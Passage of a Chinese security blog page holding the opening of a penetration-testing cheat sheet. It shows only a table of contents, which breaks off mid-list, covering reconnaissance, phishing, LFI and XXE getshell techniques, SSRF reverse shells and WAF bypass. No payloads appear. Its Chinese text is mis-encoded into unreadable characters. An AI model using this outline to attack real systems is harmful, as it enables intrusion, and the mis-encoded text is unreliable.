<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="shellcode, obelia">
    <meta name="description" content="èœğŸ”ä¸€æšï¼Œå¤§å“¥å¸¦å¸¦ï¼Ÿ">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>shellcode | obelia</title>
    <link rel="icon" type="image/png" href="/28.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/28.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">obelia</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€æ¿</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹æƒ…é“¾æ¥</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-magnet" style="zoom: 0.6;"></i>
      
      <span>Tools</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a target="_blank" rel="noopener" href="https://tool.candinya.com/id/">
          
          <i class="fas fa-address-card" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>èº«ä»½è¯ç”Ÿæˆå™¨</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://www.materialtools.com/?page=1">
          
          <i class="fas fa-infinity" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>çŸ­ä¿¡æ¥å—å¹³å°</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="http://wiki.xypbk.com/index.md">
          
          <i class="fas fa-infinity" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>qingyæ¼æ´åº“</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/28.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">obelia</div>
        <div class="logo-desc">
            
            èœğŸ”ä¸€æšï¼Œå¤§å“¥å¸¦å¸¦ï¼Ÿ
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€æ¿
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹æƒ…é“¾æ¥
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-magnet"></i>
			
			Tools
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a target="_blank" rel="noopener" href="https://tool.candinya.com/id/ " style="margin-left:75px">
				  
				   <i class="fa fas fa-address-card" style="position: absolute;left:50px" ></i>
			      
		          <span>èº«ä»½è¯ç”Ÿæˆå™¨</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://www.materialtools.com/?page=1 " style="margin-left:75px">
				  
				   <i class="fa fas fa-infinity" style="position: absolute;left:50px" ></i>
			      
		          <span>çŸ­ä¿¡æ¥å—å¹³å°</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="http://wiki.xypbk.com/index.md " style="margin-left:75px">
				  
				   <i class="fa fas fa-infinity" style="position: absolute;left:50px" ></i>
			      
		          <span>qingyæ¼æ´åº“</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">shellcode</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E9%85%8D%E7%BD%AE/">
                                <span class="chip bg-color">é…ç½®</span>
                            </a>
                        
                            <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
                                <span class="chip bg-color">æœåŠ¡å™¨</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2020-03-10
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2021-06-10
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    85.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    428 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <ul>
<li>Author:å°y</li>
<li>å…¬ä¼—å·:å…³æ³¨å®‰å…¨æŠ€æœ¯<br><img src="./img/wechat.png" alt="image"><h1 id="Pentest-Note"><a href="#Pentest-Note" class="headerlink" title="Pentest_Note"></a>Pentest_Note</h1><h3 id="è½¬è½½è¯·éšæ„ï¼Œè®°å¾—åŠ from"><a href="#è½¬è½½è¯·éšæ„ï¼Œè®°å¾—åŠ from" class="headerlink" title="è½¬è½½è¯·éšæ„ï¼Œè®°å¾—åŠ from"></a>è½¬è½½è¯·éšæ„ï¼Œè®°å¾—åŠ from</h3><h3 id="å£°æ˜1ï¼š"><a href="#å£°æ˜1ï¼š" class="headerlink" title="å£°æ˜1ï¼š"></a>å£°æ˜1ï¼š</h3>  ä¾ç…§ã€Šä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹ç­‰ç›¸å…³æ³•è§„è§„å®šï¼Œä»»ä½•ä¸ªäººå’Œç»„ç»‡ä¸å¾—ä»äº‹éæ³•ä¾µå…¥ä»–äººç½‘ç»œã€å¹²æ‰°ä»–äººç½‘ç»œæ­£å¸¸åŠŸèƒ½ã€çªƒå–ç½‘ç»œæ•°æ®ç­‰å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨ï¼›ä¸å¾—æä¾›ä¸“é—¨ç”¨äºä»äº‹ä¾µå…¥ç½‘ç»œã€å¹²æ‰°ç½‘ç»œæ­£å¸¸åŠŸèƒ½åŠé˜²æŠ¤æªæ–½ã€çªƒå–ç½‘ç»œæ•°æ®ç­‰å±å®³ç½‘ç»œå®‰å…¨æ´»åŠ¨çš„ç¨‹åºã€å·¥å…·ï¼›æ˜çŸ¥ä»–äººä»äº‹å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨çš„ï¼Œä¸å¾—ä¸ºå…¶æä¾›æŠ€æœ¯æ”¯æŒã€å¹¿å‘Šæ¨å¹¿ã€æ”¯ä»˜ç»“ç®—ç­‰å¸®åŠ©ã€‚<h3 id="å£°æ˜2ï¼š"><a href="#å£°æ˜2ï¼š" class="headerlink" title="å£°æ˜2ï¼š"></a>å£°æ˜2ï¼š</h3>  ä»¥ä¸‹å†…å®¹å‡åœ¨æœ¬åœ°å®Œæˆå¤ç°ï¼Œä¸æ¶‰åŠä»»ä½•éæ³•è¡Œä¸ºï¼Œä¸å…è®¸ä½¿ç”¨æœ¬é¡¹ç›®æ‰€æåŠçš„æ‰€æœ‰æŠ€æœ¯å†…å®¹è¿›è¡Œéæ³•è¡Œä¸ºï¼Œä½¿ç”¨æŠ€æœ¯çš„é£é™©ç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…ã€‚</li>
</ul>
<ul>
<li><p><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">ä¿¡æ¯æ”¶é›†</a></p>
<ul>
<li><a href="#whois">Whois</a></li>
<li><a href="#%E7%BD%91%E7%AB%99ip">ç½‘ç«™IP</a><ul>
<li><a href="#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8cdn">æ˜¯å¦å­˜åœ¨CDN</a></li>
<li><a href="#bypass-cdn%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F">Bypass cdnå¸¸è§„æ–¹å¼</a></li>
</ul>
</li>
<li><a href="#%E5%9F%9F%E5%90%8D%E5%8E%86%E5%8F%B2ip">åŸŸåå†å²IP</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%87%E7%BA%B9cms%E8%AF%86%E5%88%AB%E5%AE%B9%E5%99%A8">ç½‘ç«™æ¶æ„/æœåŠ¡å™¨æŒ‡çº¹/CMSè¯†åˆ«/å®¹å™¨</a></li>
<li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D">å­åŸŸå</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84cms%E7%9A%84%E5%AE%98%E6%96%B9demo%E7%AB%99">ç½‘ç«™ä½¿ç”¨çš„CMSçš„å®˜æ–¹demoç«™</a></li>
<li><a href="#ssl%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF">SSLè¯ä¹¦ä¿¡æ¯</a></li>
<li><a href="#dns%E5%8E%86%E5%8F%B2%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95">DNSå†å²è§£æè®°å½•</a></li>
<li><a href="#%E5%90%8C%E6%9C%8D%E7%AB%99%E7%82%B9%E6%83%85%E5%86%B5">åŒæœç«™ç‚¹æƒ…å†µ</a></li>
<li><a href="#%E5%90%8C%E6%A0%B7%E6%9E%B6%E6%9E%84%E6%88%96%E6%BA%90%E7%A0%81%E7%9A%84%E7%AB%99">åŒæ ·æ¶æ„æˆ–æºç çš„ç«™</a></li>
<li><a href="#%E7%BD%91%E7%AB%99js">ç½‘ç«™js</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9js">ç½‘ç«™ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹js</a></li>
<li><a href="#%E4%BA%91%E4%BF%A1%E6%81%AF">äº‘ä¿¡æ¯</a></li>
<li><a href="#app%E5%8F%8D%E7%BC%96%E8%AF%91">APPåç¼–è¯‘</a></li>
<li><a href="#c%E6%AE%B5b%E6%AE%B5%E4%BF%A1%E6%81%AF">Cæ®µ/Bæ®µä¿¡æ¯</a></li>
<li><a href="#%E5%B7%A5%E5%85%B7">å·¥å…·</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE%E6%83%85%E5%86%B5">ç«¯å£å¯¹å¤–å¼€æ”¾æƒ…å†µ</a></li>
<li><a href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%88%AC%E8%99%AB%E6%85%8E%E7%94%A8">ç›®å½•æ‰«æ/çˆ¬è™«(æ…ç”¨)</a></li>
<li><a href="#waf%E6%83%85%E5%86%B5%E8%AF%86%E5%88%AB">WAFæƒ…å†µè¯†åˆ«</a></li>
<li><a href="#%E9%9A%8F%E6%89%8B%E6%B5%8B%E8%AF%95">éšæ‰‹æµ‹è¯•</a></li>
<li><a href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">æœç´¢å¼•æ“</a></li>
<li><a href="#shodanfofazoomeye">Shodan/fofa/zoomeye</a></li>
<li><a href="#google-dorks">Google dorks</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">ä¿¡æ¯æ³„éœ²</a></li>
<li><a href="#%E7%BD%91%E9%A1%B5%E7%BC%93%E5%AD%98">ç½‘é¡µç¼“å­˜</a></li>
<li><a href="#%E5%9B%BE%E7%89%87%E5%8F%8D%E6%9F%A5">å›¾ç‰‡åæŸ¥</a></li>
<li><a href="#%E7%A4%BE%E4%BA%A4">ç¤¾äº¤</a></li>
<li><a href="#%E6%89%8B%E6%9C%BA%E5%8F%B7%E5%8A%A0%E5%85%A5%E9%80%9A%E8%AE%AF%E5%BD%95%E5%8C%B9%E9%85%8D%E5%90%84%E4%B8%AAapp%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">æ‰‹æœºå·åŠ å…¥é€šè®¯å½•åŒ¹é…å„ä¸ªAPPç”¨æˆ·ä¿¡æ¯</a></li>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%BF%87%E7%9A%84%E7%BD%91%E7%AB%99">æ³¨å†Œè¿‡çš„ç½‘ç«™</a></li>
<li><a href="#%E7%9B%AE%E6%A0%87%E4%BA%BA%E5%91%98%E7%9A%84%E5%85%B4%E8%B6%A3">ç›®æ ‡äººå‘˜çš„å…´è¶£</a></li>
<li><a href="#%E9%82%AE%E7%AE%B1%E6%90%9C%E9%9B%86">é‚®ç®±æœé›†</a></li>
<li><a href="#exchange">Exchange</a></li>
<li><a href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E7%AE%B1%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8">éªŒè¯é‚®ç®±æ˜¯å¦å­˜åœ¨</a></li>
<li><a href="#%E5%8E%86%E5%8F%B2%E6%B3%84%E9%9C%B2%E8%BF%87%E7%9A%84%E8%B5%84%E6%96%99%E7%AD%89">å†å²æ³„éœ²è¿‡çš„èµ„æ–™ç­‰</a></li>
<li><a href="#githubgitee%E7%AD%89%E4%BB%A3%E7%A0%81%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0">Github/Giteeç­‰ä»£ç æ‰˜ç®¡å¹³å°</a></li>
<li><a href="#%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%BD%91%E5%9D%80%E5%88%97%E8%A1%A8">è¢«å…¥ä¾µç½‘å€åˆ—è¡¨</a></li>
<li><a href="#gps%E6%9F%A5%E8%AF%A2">GPSæŸ¥è¯¢</a></li>
<li><a href="#%E7%BD%91%E7%AB%99url%E6%8F%90%E5%8F%96">ç½‘ç«™URLæå–</a></li>
<li><a href="#%E8%9C%9C%E7%BD%90%E5%88%A4%E6%96%AD%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%E5%8D%B3%E5%8F%AF">èœœç½åˆ¤æ–­(å‚è€ƒä¸€ä¸‹å³å¯)</a></li>
<li><a href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81">é»˜è®¤å¯†ç </a></li>
<li><a href="#%E5%A6%82%E9%9C%80%E6%B3%A8%E5%86%8C">å¦‚éœ€æ³¨å†Œ</a></li>
<li><a href="#%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF">ä¼ä¸šä¿¡æ¯</a></li>
</ul>
</li>
<li><p><a href="#%E5%85%A5%E5%8F%A3%E7%82%B9">å…¥å£ç‚¹</a></p>
<ul>
<li><a href="#win10-%E5%AE%89%E8%A3%85kaliwsl">win10 å®‰è£…kali(wsl)</a></li>
<li><a href="#%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB">æ°´å‘æ”»å‡»</a><ul>
<li><a href="#xss%E5%85%8B%E9%9A%86%E9%92%93%E9%B1%BC">XSSå…‹éš†é’“é±¼</a></li>
<li><a href="#%E4%BC%AA%E9%80%A0%E9%A1%B5%E9%9D%A2%E9%92%93%E9%B1%BC">ä¼ªé€ é¡µé¢é’“é±¼</a><ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%AF%B9%E5%A4%96%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">å¯¹å¤–æœåŠ¡æ”»å‡»</a><ul>
<li><a href="#web">Web</a><ul>
<li><a href="#%E5%89%8D%E7%AB%AF%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">å‰ç«¯/é€»è¾‘æ¼æ´</a><ul>
<li><a href="#%E6%B3%A8%E5%86%8C">æ³¨å†Œ</a></li>
<li><a href="#%E7%99%BB%E5%BD%95">ç™»å½•</a></li>
<li><a href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE">ä»»æ„å¯†ç é‡ç½®</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">ä¿¡æ¯æ³„éœ²</a></li>
<li><a href="#%E5%90%8E%E5%8F%B0">åå°</a></li>
</ul>
</li>
<li><a href="#jwt%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">JWTæ”»å‡»æ‰‹æ³•</a><ul>
<li><a href="#%E6%9C%AA%E6%A0%A1%E9%AA%8C%E7%AD%BE%E5%90%8D">æœªæ ¡éªŒç­¾å</a></li>
<li><a href="#%E7%A6%81%E7%94%A8%E5%93%88%E5%B8%8C">ç¦ç”¨å“ˆå¸Œ</a></li>
<li><a href="#%E6%9A%B4%E7%A0%B4%E5%BC%B1%E5%AF%86%E9%92%A5">æš´ç ´å¼±å¯†é’¥</a></li>
</ul>
</li>
<li><a href="#xss">XSS</a></li>
<li><a href="#csrf">CSRF</a></li>
<li><a href="#php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD">phpä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½</a></li>
<li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">phpæ–‡ä»¶åŒ…å«</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE">å¸¸ç”¨åè®®</a></li>
<li><a href="#getshell">Getshell</a><ul>
<li><a href="#allow_url_include-%E5%BC%80%E5%90%AF%E6%97%B6getshell">allow_url_include å¼€å¯æ—¶Getshell</a></li>
<li><a href="#allow_url_include-%E5%85%B3%E9%97%AD%E6%97%B6getshell">allow_url_include å…³é—­æ—¶Getshell</a></li>
<li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell">åŒ…å«æ—¥å¿—æ–‡ä»¶getshell</a></li>
<li><a href="#%E4%B8%8A%E4%BC%A0%E4%B8%AA%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB">ä¸Šä¼ ä¸ªå›¾ç‰‡æ ¼å¼çš„æœ¨é©¬ç›´æ¥åŒ…å«</a></li>
<li><a href="#%E9%99%90%E5%88%B6%E5%90%8E%E7%BC%80%E6%97%B6">é™åˆ¶åç¼€æ—¶</a></li>
<li><a href="#phpinfo-lfi-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell">phpinfo-LFI æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell</a></li>
<li><a href="#session--lfi-getshell">session + lfi getshell</a></li>
<li><a href="#lfi-ssh-log">LFI SSH Log</a></li>
<li><a href="#rfi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BFmsf">RFI&amp;å‘½ä»¤æ³¨å…¥ä¸Šçº¿MSF</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#xml">XML</a><ul>
<li><a href="#xml%E6%B3%A8%E5%85%A5">XMLæ³¨å…¥</a></li>
<li><a href="#xxe">XXE</a><ul>
<li><a href="#%E5%88%A4%E6%96%AD">åˆ¤æ–­</a></li>
<li><a href="#%E6%8C%96%E6%8E%98">æŒ–æ˜</a></li>
<li><a href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6">æœ‰å›æ˜¾è¯»å–æœ¬åœ°æ–‡ä»¶</a></li>
<li><a href="#blind-oob-xxe%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96">Blind OOB XXEæ— å›æ˜¾è¯»å–</a></li>
<li><a href="#%E5%88%97%E7%9B%AE%E5%BD%95">åˆ—ç›®å½•</a></li>
<li><a href="#%E4%B8%8D%E5%90%8C%E5%B9%B3%E5%8F%B0%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE">ä¸åŒå¹³å°æ”¯æŒçš„åè®®</a></li>
<li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">æ‰§è¡Œå‘½ä»¤</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B">å†…ç½‘ä¸»æœºæ¢æµ‹</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">å†…ç½‘ç«¯å£æ‰«æ</a></li>
<li><a href="#%E5%86%85%E9%83%A8dtd%E5%88%A9%E7%94%A8">å†…éƒ¨DTDåˆ©ç”¨</a></li>
<li><a href="#linux">Linux</a></li>
<li><a href="#windows">Windows</a></li>
<li><a href="#xxe%E5%86%99shell">XXEå†™shell</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ssrf">SSRF</a><ul>
<li><a href="#%E5%AE%9A%E4%B9%89">å®šä¹‰</a></li>
<li><a href="#%E6%88%90%E5%9B%A0">æˆå› </a></li>
<li><a href="#%E6%8C%96%E6%8E%98">æŒ–æ˜</a><ul>
<li><a href="#xml">XML</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">æ•°æ®åº“</a></li>
<li><a href="#mongodb">MongoDB</a></li>
<li><a href="#postgressql">PostgresSQL</a></li>
<li><a href="#mssql">MSSQL</a></li>
<li><a href="#%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0">å›¾ç‰‡å¤„ç†å‡½æ•°</a></li>
</ul>
</li>
<li><a href="#%E6%94%BB%E5%87%BB">æ”»å‡»</a><ul>
<li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">æ–‡ä»¶è¯»å–</a></li>
</ul>
</li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">ç«¯å£æ¢æµ‹</a><ul>
<li><a href="#ssrfredis">SSRF+Redis</a></li>
<li><a href="#302%E5%8F%8D%E5%BC%B9shell">302åå¼¹shell</a></li>
<li><a href="#mysql">Mysql</a></li>
<li><a href="#weblogic-ssrfredis">Weblogic SSRF+Redis</a></li>
<li><a href="#ueditor-ssrf">Ueditor SSRF</a></li>
<li><a href="#discuz">Discuz</a></li>
<li><a href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">æ¢æµ‹å­˜æ´»ä¸»æœº</a></li>
<li><a href="#%E5%86%85%E5%A4%96%E7%BD%91%E8%B5%84%E4%BA%A7%E5%AF%B9%E5%BA%94">å†…å¤–ç½‘èµ„äº§å¯¹åº”</a></li>
<li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">ç»•è¿‡æ–¹æ³•</a></li>
<li><a href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BD%AC%E6%8D%A2">gopheråè®®çš„è„šæœ¬è½¬æ¢</a></li>
<li><a href="#%E5%8D%8F%E8%AE%AE">åè®®</a></li>
<li><a href="#dict%E5%8D%8F%E8%AE%AE%E5%86%99shell">dictåè®®å†™shell</a></li>
<li><a href="#slaveof%E5%A4%8D%E5%88%B6shell%E5%88%B0%E7%9B%AE%E6%A0%87">slaveofå¤åˆ¶shellåˆ°ç›®æ ‡</a></li>
<li><a href="#slaveof%E5%8F%8D%E5%BC%B9shell">slaveofåå¼¹shell</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#fuzz%E6%89%AB%E6%8F%8Fweb">Fuzz/æ‰«æweb </a><ul>
<li><a href="#wfuzz">WFuzz</a></li>
<li><a href="#cewl">Cewl</a></li>
<li><a href="#dirsearch">Dirsearch</a></li>
</ul>
</li>
<li><a href="#bypass-waf">Bypass WAF</a><ul>
